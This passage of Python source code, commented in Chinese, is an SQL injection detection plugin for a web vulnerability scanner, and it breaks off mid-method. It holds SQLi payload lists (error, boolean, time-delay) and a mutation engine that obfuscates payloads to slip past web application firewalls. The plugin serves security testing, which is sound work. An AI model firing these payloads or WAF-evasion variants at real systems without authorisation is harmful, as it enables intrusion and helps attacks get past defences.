"""plugins/pocs/sqli_scan.py — SQL 注入检测插件 (v3.0 Enterprise)

检测方法 (五层递进):
  ① 智能注入点嗅探 / 手动定向 (Injection Point Discovery)
     → 自动区分测试参数 (id, user, query) 与业务背景参数 (Submit, action)
     → 支持 target_param 手动锁定注入点
     → 业务参数全量保留，仅对可疑参数发起注入探测

  ② 报错注入 (Error-Based)
     → 内置 MySQL / PostgreSQL / MSSQL / Oracle / SQLite 错误特征码
     → 检测到数据库类型后写入 shared_context 供变异引擎使用

  ③ 动态变异探测 (Mutation Evasion Engine)
     → 基于 shared_context 中的数据库类型和 WAF 指纹实时生成混淆 Payload

  ④ 自适应布尔盲注 (Adaptive Boolean-Based Blind)
     → 使用「响应指纹」(Response Fingerprint) 替代原始 HTML 全文对比
     → 自适应相对差值模型: 只要 (Baseline↔True) 显著高于 (Baseline↔False)
       且差值 > 0.05 即判定，废弃静态 0.92 阈值
     → HTML 标签剔除 → 纯文本比对，排除布局微调导致的误报
     → 响应体文字比例 + 状态码 + Content-Length 三维指纹

  ⑤ 时间盲注 (Time-Based Blind) + 网络延迟校准
     → 预采样 3 轮空包获取网络基准延迟 (calibration)
     → 动态阈值: 只有 (响应时间 - 基准) ≈ SLEEP 秒数才判定
     → 自动降低并发至 1 防止串扰

  ⑥ WAF 联动
     → 读取 shared_context 中的 WAF 检测结果
     → 若存在 WAF，自动增加请求间随机延迟 + 变异引擎
"""

from __future__ import annotations

import asyncio
import hashlib
import logging
import random
import re
import time as _time
import difflib
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, parse_qsl, urlencode, urlunparse

import httpx

from core.request import AsyncRequester
from plugins.base import BasePlugin, PluginMeta, ScanResult, Severity

logger = logging.getLogger("openscanner.plugin.sqli")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 数据库错误特征码
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dataclass(frozen=True)
class DbErrorSignature:
    """数据库错误回显特征"""
    db_type: str
    patterns: List[str]  # 正则模式列表


_DB_ERROR_SIGNATURES: List[DbErrorSignature] = [
    # ── MySQL ──
    DbErrorSignature(
        db_type="MySQL",
        patterns=[
            r"SQL syntax.*?MySQL",
            r"Warning.*?\Wmysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"check the manual that (corresponds to|fits) your MySQL server version",
            r"Unknown column '[^']+' in 'field list'",
            r"MySqlClient\.",
            r"com\.mysql\.jdbc",
            r"Unclosed quotation mark after the character string",
            r"SQLSTATE\[HY000\]",
            r"mysql_fetch_array\(\)",
            r"You have an error in your SQL syntax",
        ],
    ),
    # ── PostgreSQL ──
    DbErrorSignature(
        db_type="PostgreSQL",
        patterns=[
            r"PostgreSQL.*?ERROR",
            r"Warning.*?\Wpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"PG::SyntaxError:",
            r"org\.postgresql\.util\.PSQLException",
            r'ERROR:\s+syntax error at or near "[^"]+"',
            r"ERROR: parser: parse error at or near",
            r"PostgreSQL query failed",
            r"org\.postgresql\.jdbc",
        ],
    ),
    # ── Microsoft SQL Server ──
    DbErrorSignature(
        db_type="MSSQL",
        patterns=[
            r"Driver.*? SQL[\-\_\ ]*Server",
            r"OLE DB.*? SQL Server",
            r"\bSQL Server[^&lt;&quot;]+Driver\b",
            r"Warning.*?\W(mssql|sqlsrv)_",
            r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}\b",
            r"System\.Data\.SqlClient\.",
            r"(?s)Exception.*?\bRoadhouse\.Cms\b",
            r"Microsoft SQL Native Client error '[0-9a-fA-F]{8}",
            r"\[SQL Server\]",
            r"ODBC SQL Server Driver",
            r"ODBC Driver.*? for SQL Server",
            r"SQLServer JDBC Driver",
            r"macaborting the operation",
            r"com\.jnetdirect\.jsql",
            r"com\.microsoft\.sqlserver\.jdbc",
            r"Msg \d+, Level \d+, State \d+",
            r"Unclosed quotation mark after the character string",
        ],
    ),
    # ── Oracle ──
    DbErrorSignature(
        db_type="Oracle",
        patterns=[
            r"\bORA-\d{5}",
            r"Oracle error",
            r"Oracle.*?Driver",
            r"Warning.*?\Woci_",
            r"Warning.*?\Wora_",
            r"oracle\.jdbc",
            r"quoted string not properly terminated",
            r"SQL command not properly ended",
        ],
    ),
    # ── SQLite ──
    DbErrorSignature(
        db_type="SQLite",
        patterns=[
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"(Microsoft|System)\.Data\.SQLite\.SQLiteException",
            r"Warning.*?\Wsqlite_",
            r"Warning.*?\WSQLite3::",
            r"\[SQLITE_ERROR\]",
            r"SQLite3::query",
            r"SQLSTATE\[HY000\].*?general error.*?(?:1|11)",
            r"unrecognized token:",
        ],
    ),
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SQLi 探测 Payload 集合
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# 报错注入 payload
_ERROR_PAYLOADS: List[str] = [
    # 基础探测
    "'",
    "\"",
    "\\",
    "';",
    # 基于逻辑或
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "1' OR '1'='1'/*",
    "') OR ('1'='1",
    # 基于数学运算
    "1 AND 1=1",
    "1 / 0",
    "1 * 1",
    "-1",
    # 数据库特征探针
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",   # MySQL
    "1' AND UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(113)||CHR(118)||CHR(113)||CHR(113))--", # Oracle
    "1 AND 1=CONVERT(int, @@version)--",                 # SQL Server
    "1' UNION SELECT NULL--",
    "1' ORDER BY 100--",
    "';WAITFOR DELAY '0:0:0'--",                         # Time-based inference test
]

# 时间盲注 payload (db_type → payload template)
_TIME_BASED_PAYLOADS: Dict[str, List[Tuple[str, float]]] = {
    # (payload_template, expected_delay_seconds)
    "mysql": [
        ("' AND SLEEP({delay})--", 5.0),
        ("' OR SLEEP({delay})#", 5.0),
        ("1' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--", 5.0),
    ],
    "mssql": [
        ("';WAITFOR DELAY '0:0:{delay}'--", 5.0),
        ("' AND 1=(SELECT 1 FROM (SELECT SLEEP({delay}))a)--", 5.0),
    ],
    "postgresql": [
        ("'; SELECT pg_sleep({delay})--", 5.0),
        ("' AND 1=(SELECT 1 FROM pg_sleep({delay}))--", 5.0),
    ],
    "oracle": [
        ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--", 5.0),
    ],
    "sqlite": [
        ("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({delay}00000000))))--", 3.0),
    ],
    "unknown": [
        ("' AND SLEEP({delay})--", 5.0),
        ("';WAITFOR DELAY '0:0:{delay}'--", 5.0),
        ("'; SELECT pg_sleep({delay})--", 5.0),
    ],
}

# 布尔盲注 payload 对 (true_suffix, false_suffix)
_BOOLEAN_PAYLOAD_PAIRS: List[Tuple[str, str]] = [
    # 基础比较
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    (" AND 1=1--", " AND 1=2--"),
    # 闭合括号
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("') AND 1=1--", "') AND 1=2--"),
    # 基于数学
    (" AND 738=738", " AND 738=739"),
    # ORDER BY 盲猜 (针对某些特定的场景)
    ("' ORDER BY 1--", "' ORDER BY 9999--"),
    # 基于 OR 逻辑 (可能改变页面返回条数)
    (" OR 1=1", " OR 1=2"),
]

# WAF 绕过编码变体
_WAF_EVASION_PAYLOADS: List[str] = [
    "'%20OR%20'1'%3D'1",
    "'/**/OR/**/1=1--",
    "' /*!50000OR*/ '1'='1",
    "' OR 1=1#",
    "'+OR+'1'='1",
    "'%2520OR%25201=1",  # 双重复合编码
]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 文本相似度工具
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def similarity_ratio(s1: str, s2: str) -> float:
    """
    基于 difflib 的文本相似度比率 [0.0 ~ 1.0]
    1.0 = 完全相同, 0.0 = 完全不同
    为保障引擎性能防 DoS，截断至前 5,000 字符。
    """
    s1 = s1[:5_000]
    s2 = s2[:5_000]
    if not s1 and not s2:
        return 1.0
    return difflib.SequenceMatcher(None, s1, s2).ratio()


class SimHash:
    """
    SimHash 模糊哈希 — 用于快速判断两段文本的结构相似度

    原理：将文本分词（shingles），对每个 shingle 计算 hash，
    按 bit 位加权投票，最终压缩为 64-bit 指纹。
    两个指纹的海明距离越小，文本越相似。
    """

    def __init__(self, text: str, shingle_size: int = 4) -> None:
        self._text = text[:10_000]
        self._shingle_size = shingle_size
        self._hash = self._compute()

    def _compute(self) -> int:
        """计算 64-bit SimHash 指纹"""
        weights = [0] * 64
        tokens = self._shingles()

        for token in tokens:
            h = int(hashlib.md5(token.encode("utf-8")).hexdigest(), 16)
            for i in range(64):
                bit = (h >> i) & 1
                weights[i] += 1 if bit else -1

        fingerprint = 0
        for i in range(64):
            if weights[i] > 0:
                fingerprint |= (1 << i)

        return fingerprint

    def _shingles(self) -> List[str]:
        """将文本切分为 n-gram shingle"""
        text = re.sub(r"\s+", " ", self._text.lower().strip())
        if len(text) < self._shingle_size:
            return [text] if text else []
        return [
            text[i : i + self._shingle_size]
            for i in range(len(text) - self._shingle_size + 1)
        ]

    @property
    def value(self) -> int:
        return self._hash

    def hamming_distance(self, other: "SimHash") -> int:
        """计算两个 SimHash 之间的海明距离 (0 ~ 64)"""
        xor = self._hash ^ other._hash
        return bin(xor).count("1")

    def similarity(self, other: "SimHash") -> float:
        """海明相似度 [0.0 ~ 1.0]"""
        return 1.0 - (self.hamming_distance(other) / 64.0)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 工具函数
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _extract_params(url: str) -> Dict[str, str]:
    """
    从 URL 中提取查询参数（全量保留，含空值参数）。

    使用 ``parse_qsl`` 而非 ``parse_qs`` 以保持参数原始顺序，
    并通过 ``keep_blank_values=True`` 防止空值参数（如 ``&debug=``）丢失。

    .. note::
        对包含 ``#`` 的 URL，``urlparse`` 会将 ``#`` 之后视为 fragment。
        本函数解析的是 ``parsed.query``，不含 fragment 部分。
        如需注入含 ``#`` 的 payload，请在注入阶段由 ``_inject_param``
        通过 ``smart_merge`` 的安全编码机制处理。
    """
    parsed = urlparse(url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    return dict(qs)


from core.request import smart_merge


def _sql_safe_encode_payload(payload: str) -> str:
    """
    对 SQL 注入 payload 进行传输安全化预处理（原始字符层面）。

    本函数在 payload 拼入 URL **之前** 调用，操作的是原始字符串，
    不应包含任何 percent-encoding（那是后续 ``urlencode`` 的职责）。

    处理规则：
    - ``#`` → 保留原样（由 ``smart_merge`` 内部的 ``_sql_safe_urlencode``
      在 ``urlencode()`` 之后统一转义为 ``%23``）
    - 末尾 ``--`` → 追加一个空格字符，确保 SQL 行注释符与后续内容分隔
      （``urlencode`` 会将空格编码为 ``+`` 或 ``%20``）

    注意：
        ``_sql_safe_urlencode``（在 ``core/request.py``）负责第二层保障，
        处理 ``urlencode`` 之后查询字符串中残留的 ``#`` 和 ``--``。
    """
    safe = payload
    # 末尾 -- 后如不带空格，补一个真实空格字符
    # urlencode 会将空格编码为 + 或 %20，防止粘连后续参数
    if safe.endswith("--"):
        safe += " "
    return safe


def _inject_param(
    url: str,
    param: str,
    payload: str,
    context_params: Optional[Dict[str, str]] = None,
) -> str:
    """
    将 payload 注入到 URL 的指定参数中，并保留全量原始参数。

    参数合并优先级 (高 → 低):
        1. 被注入的 ``param=original_value + payload`` (最高)
        2. ``context_params`` (业务必带参数，Key 冲突时覆盖 URL 原值)
        3. URL 原始参数 (基线保留)

    安全保障:
        - Payload 先经 ``_sql_safe_encode_payload`` 预处理
        - ``smart_merge`` 内部的 ``_sql_safe_urlencode`` 做二次编码保护
        - ``#`` 不会被 httpx 误判为 fragment，``Submit`` 等参数全量保留

    Args:
        url:             目标 URL (如 ``http://dvwa/vuln.php?id=1&Submit=Submit``)
        param:           要注入的参数名 (如 ``"id"``)
        payload:         注入的 SQL payload 后缀 (如 ``"' OR 1=1#"``)
        context_params:  业务上下文附加参数 (如 ``{"Submit": "Submit"}``)

    Returns:
        完整注入后的 URL 字符串，保留所有参数。

    注意 (POST 注入预留):
        当前实现仅生成 GET 请求的注入 URL。
        对于 POST 注入场景，调用方应：
        1. 使用本函数的参数合并逻辑获取 ``params_dict``
        2. 将 ``params_dict`` 作为 ``data=`` 参数传递给 ``requester.post()``
        3. URL 保持不变（仅 path 部分）
        后续版本将提供 ``_inject_param_post()`` 专用接口。
    """
    context_params = context_params or {}
    parsed = urlparse(url)

    # 全量提取 URL 原始参数（保持顺序，保留空值）
    original_qs = parse_qsl(parsed.query, keep_blank_values=True)
    original_params = dict(original_qs)

    # 取目标参数的原始值，拼接 payload 后缀
    original_value = original_params.get(param, "")
    safe_payload = _sql_safe_encode_payload(payload)
    injected_value = original_value + safe_payload

    # 委托 smart_merge 执行优先级合并 + 安全编码
    return smart_merge(url, context_params, param, injected_value)

def _strip_html_tags(text: str) -> str:
    """剔除 HTML 标签，仅保留页面可见文字 (Text Only)"""
    # 移除 script / style 块
    text = re.sub(r'<(script|style)[^>]*>[\s\S]*?</\1>', '', text, flags=re.IGNORECASE)
    # 移除所有 HTML 标签
    text = re.sub(r'<[^>]+>', ' ', text)
    # 合并空白
    text = re.sub(r'\s+', ' ', text).strip()
    return text


def _strip_dynamic_content(text: str) -> str:
    """
    去除响应体中的动态内容（CSRF token, 时间戳, session ID 等）
    并剔除 HTML 标签，只比对纯文本，排除布局微调导致的误报。
    """
    # 移除 CSRF token
    text = re.sub(r'name=["\']csrf[^"\']*["\'][^>]*value=["\'][^"\']*["\']', "", text)
    text = re.sub(r'value=["\'][^"\']*["\'][^>]*name=["\']csrf[^"\']*["\']', "", text)
    # 移除时间戳 (Unix epoch)
    text = re.sub(r"\b\d{10,13}\b", "", text)
    # 移除 UUID
    text = re.sub(
        r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}",
        "",
        text,
        flags=re.IGNORECASE,
    )
    # 移除 session/token 类参数
    text = re.sub(r'(session|token|nonce|sid)["\']?\s*[:=]\s*["\']?[A-Za-z0-9+/=_-]+', "", text)
    # 剔除 HTML 标签，仅保留文字
    text = _strip_html_tags(text)
    return text


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 响应指纹 (SQLmap-style Comparison)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@dataclass
class ResponseFingerprint:
    """
    响应指纹 — 类似 sqlmap 的多维度比对模型。

    不再对比整段 HTML，而是提取三维特征：
      1. 纯文本内容 (stripped_text)
      2. 状态码 (status_code)
      3. 内容长度 (content_length)
      4. 文字比例 (text_ratio = 纯文本长度 / 原始 HTML 长度)
    """
    stripped_text: str
    status_code: int
    content_length: int
    text_ratio: float

    @classmethod
    def from_response(cls, resp: Any) -> "ResponseFingerprint":
        """从 httpx.Response 构建指纹"""
        raw_text = resp.text
        stripped = _strip_dynamic_content(raw_text)
        raw_len = max(len(raw_text), 1)
        return cls(
            stripped_text=stripped,
            status_code=resp.status_code,
            content_length=len(raw_text),
            text_ratio=len(stripped) / raw_len,
        )

    def similarity_to(self, other: "ResponseFingerprint") -> float:
        """
        与另一个指纹的综合相似度 [0.0 ~ 1.0]。

        权重分配:
          - 文本相似度 (Levenshtein): 60%
          - 状态码匹配:               20%
          - 文字比例差异:             10%
          - 内容长度差异:             10%
        """
        # 文本相似度
        text_sim = similarity_ratio(self.stripped_text, other.stripped_text)

        # 状态码
        status_sim = 1.0 if self.status_code == other.status_code else 0.0

        # 文字比例差异 (容忍 5% 波动)
        ratio_diff = abs(self.text_ratio - other.text_ratio)
        ratio_sim = max(0.0, 1.0 - ratio_diff * 20.0)  # 5% diff → 0.0

        # 内容长度差异 (容忍 5% 波动)
        max_len = max(self.content_length, other.content_length, 1)
        len_diff = abs(self.content_length - other.content_length) / max_len
        len_sim = max(0.0, 1.0 - len_diff * 20.0)  # 5% diff → 0.0

        return (
            text_sim * 0.60
            + status_sim * 0.20
            + ratio_sim * 0.10
            + len_sim * 0.10
        )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 智能注入点嗅探
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# 业务背景参数的正则模式——命中的参数不会被注入，而是全量保留
_BUSINESS_PARAM_PATTERNS: List[re.Pattern] = [
    re.compile(r"^submit$", re.IGNORECASE),
    re.compile(r"^action$", re.IGNORECASE),
    re.compile(r"^btn[_-]?", re.IGNORECASE),
    re.compile(r"^button$", re.IGNORECASE),
    re.compile(r"^csrf[_-]?token$", re.IGNORECASE),
    re.compile(r"^_?token$", re.IGNORECASE),
    re.compile(r"^nonce$", re.IGNORECASE),
    re.compile(r"^__viewstate", re.IGNORECASE),
    re.compile(r"^__eventvalidation", re.IGNORECASE),
    re.compile(r"^__requestverificationtoken", re.IGNORECASE),
    re.compile(r"^_method$", re.IGNORECASE),
    re.compile(r"^utf8$", re.IGNORECASE),
    re.compile(r"^authenticity_token$", re.IGNORECASE),
    re.compile(r"^captcha", re.IGNORECASE),
    re.compile(r"^g-recaptcha", re.IGNORECASE),
    re.compile(r"^timestamp$", re.IGNORECASE),
    re.compile(r"^ts$", re.IGNORECASE),
    re.compile(r"^_$", re.IGNORECASE),  # jQuery cache-buster
    re.compile(r"^callback$", re.IGNORECASE),  # JSONP
]


@dataclass
class InjectionPoint:
    """注入点分析结果"""
    test_params: List[str]              # 需要注入测试的参数名
    background_params: Dict[str, str]   # 业务背景参数 (全量保留)


def _discover_injection_points(
    url: str,
    context_business_params: Optional[Dict[str, str]] = None,
) -> InjectionPoint:
    """
    参数嗅探引擎 — 自动拆解 URL 参数为「测试点」和「业务背景」。

    规则：
        1. 如果参数名命中 ``_BUSINESS_PARAM_PATTERNS``（如 Submit / action / token），
           归类为「业务背景」，在注入时全量保留不做修改。
        2. 如果 ``context_business_params`` 中显式声明了某参数，强制归类为背景。
        3. 剩余参数全部归类为「测试点」，依次进行注入探测。
        4. 背景参数来自两个源头的合并：URL 中命中规则的参数 + context_business_params。
           当 Key 冲突时，context_business_params 优先覆盖。

    Args:
        url:                      目标 URL
        context_business_params:  由 engine 传入的业务必带参数

    Returns:
        InjectionPoint 包含 test_params 列表和 background_params 字典
    """
    context_business_params = context_business_params or {}
    all_params = _extract_params(url)

    test_params: List[str] = []
    background_params: Dict[str, str] = {}

    for name, value in all_params.items():
        # 规则 2: context 显式声明的业务参数
        if name in context_business_params:
            background_params[name] = context_business_params[name]
            continue

        # 规则 1: 模式匹配识别业务参数
        is_business = any(pat.search(name) for pat in _BUSINESS_PARAM_PATTERNS)
        if is_business:
            background_params[name] = value
        else:
            test_params.append(name)

    # 合并 context 中额外的业务参数（URL 中不存在但 context 要求保留的）
    for name, value in context_business_params.items():
        if name not in background_params:
            background_params[name] = value

    logger.info(
        "[SQLi/Sniff] 注入点嗅探完成 | 测试点: %s | 背景参数: %s",
        test_params or "(无)",
        list(background_params.keys()) or "(无)",
    )

    return InjectionPoint(
        test_params=test_params,
        background_params=background_params,
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 动态变异探测引擎
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _random_case(keyword: str) -> str:
    """对 SQL 关键词进行大小写随机变异（如 SELECT → sElEcT）"""
    return "".join(
        c.upper() if random.random() > 0.5 else c.lower() for c in keyword
    )


def _inline_comment_wrap(keyword: str) -> str:
    """用 MySQL 版本化内联注释包裹关键词（如 SELECT → /*!50000SELECT*/）"""
    version = random.choice(["50000", "50001", "40100", "50500"])
    return f"/*!{version}{keyword}*/"


def _hex_encode(s: str) -> str:
    """将字符串转为 0x 十六进制编码（用于 MySQL 字符串绕过）"""
    return "0x" + s.encode().hex()


def mutate_payload(
    base_payloads: List[str],
    context: Dict[str, Any],
) -> List[str]:
    """
    动态变异探测引擎 — 基于 shared_context 中的数据库类型和 WAF 指纹，
    实时生成混淆 Payload 变体。

    变异策略：
        1. **大小写随机变异** — ``OR`` → ``oR``, ``SELECT`` → ``sElEcT``
        2. **内联注释干扰**  — ``SELECT`` → ``/*!50000SELECT*/``
        3. **Hex/URL 双重复合编码** — 针对特定 WAF 的深度混淆
        4. **空格替代符**    — 空格 → ``/**/`` / ``%09`` / ``%0a``
        5. **数据库特化**    — MySQL 用 ``#`` 注释, MSSQL 用 ``--``, 等

    Args:
        base_payloads: 原始 payload 列表
        context:       shared_context (含 waf / detected_db_type)

    Returns:
        去重后的变异 payload 列表（不含原始 payload）
    """
    db_type = context.get("detected_db_type", "").lower()
    waf_data = context.get("waf", {})
    waf_names = set()
    for info in waf_data.values():
        for name in info.get("waf_list", []):
            waf_names.add(name.lower())

    mutated: List[str] = []
    space_alternatives = ["/**/", "%09", "%0a", "%0d", "+"]

    for payload in base_payloads:
        # ── 策略 1: 大小写随机变异 ──
        keywords = ["OR", "AND", "SELECT", "UNION", "FROM", "WHERE",
                    "ORDER", "BY", "NULL", "CONCAT", "EXTRACTVALUE"]
        mutated_payload = payload
        for kw in keywords:
            if kw in payload.upper():
                # 用正则不区分大小写替换
                mutated_payload = re.sub(
                    re.escape(kw), _random_case(kw), mutated_payload,
                    flags=re.IGNORECASE,
                )
        if mutated_payload != payload:
            mutated.append(mutated_payload)

        # ── 策略 2: 内联注释干扰 (MySQL 特化) ──
        if db_type in ("", "mysql"):
            for kw in ["OR", "AND", "UNION", "SELECT"]:
                if kw.lower() in payload.lower():
                    commented = re.sub(
                        re.escape(kw),
                        _inline_comment_wrap(kw),
                        payload,
                        flags=re.IGNORECASE,
                    )
                    mutated.append(commented)
                    break  # 每个 payload 只做一次内联注释变异

        # ── 策略 3: 空格替代符 ──
        if " " in payload:
            alt = random.choice(space_alternatives)
            mutated.append(payload.replace(" ", alt, 1))  # 替换第一个空格

        # ── 策略 4: WAF 特化双重编码 ──
        if waf_names:
            # Cloudflare / ModSecurity → URL 双重编码
            if waf_names & {"cloudflare", "modsecurity", "imperva"}:
                double_encoded = payload.replace("'", "%2527").replace(" ", "%2520")
                mutated.append(double_encoded)
            # 通用: Hex 编码 '1'='1' 中的字符串部分
            hex_variant = payload.replace("'1'", _hex_encode("1"))
            if hex_variant != payload:
                mutated.append(hex_variant)

        # ── 策略 5: 数据库特化注释符 ──
        if db_type == "mysql" and payload.endswith("--"):
            mutated.append(payload[:-2] + "#")
        elif db_type == "mssql" and payload.endswith("#"):
            mutated.append(payload[:-1] + "--")

    # 去重 + 排除原始 payload
    original_set = set(base_payloads)
    seen: set = set()
    result: List[str] = []
    for p in mutated:
        if p not in original_set and p not in seen:
            seen.add(p)
            result.append(p)

    logger.debug(
        "[SQLi/Mutate] 生成 %d 个变异 payload (db=%s, waf=%s)",
        len(result), db_type or "unknown", list(waf_names) or "none",
    )
    return result


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SQLi 扫描插件 (v3.0 Enterprise)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class SqliScanPlugin(BasePlugin):
    """
    SQL 注入检测插件 — 五层递进联合探测 (v3.0 Enterprise)

    检测流程:
        1. 智能注入点嗅探 / 手动定向 → 区分测试参数与业务背景
        2. 报错注入 (基础 + 变异 payload)
        3. 自适应布尔盲注 (响应指纹 + 相对差值模型)
        4. 时间盲注 (预采样校准 + 动态阈值)
        5. 动态变异引擎 → 基于 DB 类型和 WAF 指纹生成混淆 payload

    进度回调:
        context["progress_callback"](current, total, label)
        label 中包含当前发出的 Raw Payload，方便用户手动调试
    """

    meta = PluginMeta(
        name="sqli_scan",
        display_name="SQL Injection Scanner",
        description="五层递进 SQL 注入检测 (嗅探 + 报错 + 自适应盲注 + 时间盲注 + 变异引擎)",
        severity=Severity.HIGH,
        tags=["sqli", "injection", "owasp-top10"],
        version="3.0.0",
    )

    # 自适应布尔盲注阈值 — 废弃静态 0.92，改用相对差值模型
    ADAPTIVE_DIFF_THRESHOLD = 0.05      # (base↔true) - (base↔false) 最低差值
    SIMHASH_DIFF_THRESHOLD = 0.05
    # 时间盲注配置
    TIME_CALIBRATION_ROUNDS = 3         # 预采样轮数
    TIME_TOLERANCE_RATIO = 0.7          # 响应延迟需达到 SLEEP 值的 70% 才判定

    def _fire_progress(
        self,
        callback: Any,
        current: int,
        total: int,
        label: str = "",
    ) -> None:
        """安全地触发进度回调，支持 2-arg 和 3-arg 两种签名（加缓存防阻塞）"""
        if not callback:
            return
            
        cb_id = id(callback)
        if not hasattr(self, "_cb_has_label_cache"):
            self._cb_has_label_cache = {}
            
        has_label = self._cb_has_label_cache.get(cb_id)
        if has_label is None:
            try:
                import inspect
                sig = inspect.signature(callback)
                has_label = len(sig.parameters) >= 3
                self._cb_has_label_cache[cb_id] = has_label
            except Exception as exc:
                logger.debug("[SQLi] progress_callback 分析异常: %s", exc)
                return

        try:
            if has_label:
                callback(current, total, label)
            else:
                callback(current, total)
        except Exception as exc:
            logger.debug("[SQLi] progress_callback 异常: %s", exc)

    def _clean_url(self, url: str) -> str:
        """剥离 URL 末尾的 # 锚点，防止网络库截断请求"""
        return url.split("#")[0]

    async def check(
        self,
        url: str,
        requester: AsyncRequester,
        context: Optional[Dict[str, Any]] = None,
    ) -> ScanResult:
        """
        主检测入口 — 四层递进扫描

        参数流向:
            context["business_params"]
              ↓ _discover_injection_points()
            InjectionPoint.background_params ──→ _inject_param(context_params=...)
              ↓                                    ↓
            InjectionPoint.test_params          smart_merge(context_params=...)
              ↓                                    ↓
            报错注入 + 变异探测 + 盲注            最终 URL 查询字符串
        """
        context = context or {}
        
        # ── URL 预处理: 剥离锚点 ──
        url = self._clean_url(url)
        all_params = _extract_params(url)

        if not all_params and not context.get("target_param"):
            logger.info("[SQLi] 跳过无参数 URL: %s", url)
            return self.result(
                url,
                is_vulnerable=False,
                detail="URL 无查询参数，跳过 SQLi 检测",
            )

        # (Cookie 处理已全局前移至 AsyncRequester 配置)

        business_params_from_ctx: Dict[str, str] = context.get("business_params", {})
        target_param = context.get("target_param", "").strip()

        if target_param:
            # 定向注入：只测 target_param，其它全保留
            test_params = [target_param]
            merged_background = {k: v for k, v in all_params.items() if k != target_param}
            for k, v in business_params_from_ctx.items():
                if k != target_param:
                    merged_background[k] = v
            logger.info("[SQLi] ⚡ 定向注入，锁定测试点: %s", target_param)
        else:
            # ── Layer 1: 智能注入点嗅探 ──
            injection = _discover_injection_points(url, business_params_from_ctx)
            if not injection.test_params:
                logger.info("[SQLi] 所有参数均识别为业务背景: %s", url)
                return self.result(
                    url,
                    is_vulnerable=False,
                    detail="所有参数均为业务背景参数，无可注入测试点",
                )
            test_params = injection.test_params
            merged_background = injection.background_params

        # 进度回调
        progress_callback = context.get("progress_callback")

        # 检查 WAF 状态
        waf_detected = self._check_waf_status(url, context)
        if waf_detected:
            logger.info("[SQLi] ⚠ 目标存在 WAF，启用隐蔽模式 + 变异引擎")

        # ── 预计算总进度 ──
        base_error_payloads = _ERROR_PAYLOADS.copy()
        if waf_detected:
            base_error_payloads.extend(_WAF_EVASION_PAYLOADS)

        mutated_payloads = mutate_payload(base_error_payloads, context)
        all_error_payloads = base_error_payloads + mutated_payloads
        error_count = len(all_error_payloads)
        boolean_count = len(_BOOLEAN_PAYLOAD_PAIRS)
        # 预估时间盲注 payload 数
        db_key = context.get("detected_db_type", "unknown").lower()
        time_payloads = _TIME_BASED_PAYLOADS.get(db_key, _TIME_BASED_PAYLOADS["unknown"])
        time_count = len(time_payloads)
        total_per_param = error_count + boolean_count + time_count
        total_steps = len(test_params) * total_per_param
        current_step = 0

        # ── 网络延迟校准 (Calibration) ──
        calibration_times: List[float] = []
        for _ in range(self.TIME_CALIBRATION_ROUNDS):
            try:
                t0 = _time.monotonic()
                await requester.get(url)
                calibration_times.append(_time.monotonic() - t0)
            except Exception:
                calibration_times.append(1.0)
        network_baseline = sum(calibration_times) / len(calibration_times) if calibration_times else 0.5
        logger.info("[SQLi] 网络基准延迟: %.3fs (样本=%d)", network_baseline, len(calibration_times))

        # 获取基线响应 + 指纹
        try:
            baseline_resp = await requester.get(url)
            baseline_fp = ResponseFingerprint.from_response(baseline_resp)
            baseline_text = baseline_fp.stripped_text
            baseline_status = baseline_resp.status_code
        except Exception as exc:
            logger.error("[SQLi] 基线请求失败: %s → %s", url, exc)
            return self.result(
                url,
                is_vulnerable=False,
                detail=f"基线请求失败: {exc}",
            )

        findings: List[Dict[str, Any]] = []
        attempts: List[Dict[str, Any]] = []

        # 预扫描 baseline 中已存在的 DB 错误 pattern (排除页面自带 SQL 关键字)
        baseline_matching_patterns: set = set()
        for sig in _DB_ERROR_SIGNATURES:
            for pattern in sig.patterns:
                if re.search(pattern, baseline_resp.text, re.IGNORECASE):
                    baseline_matching_patterns.add(pattern)
        if baseline_matching_patterns:
            logger.info(
                "[SQLi] Baseline 中已存在 %d 个 DB 错误 pattern，将在报错注入阶段排除",
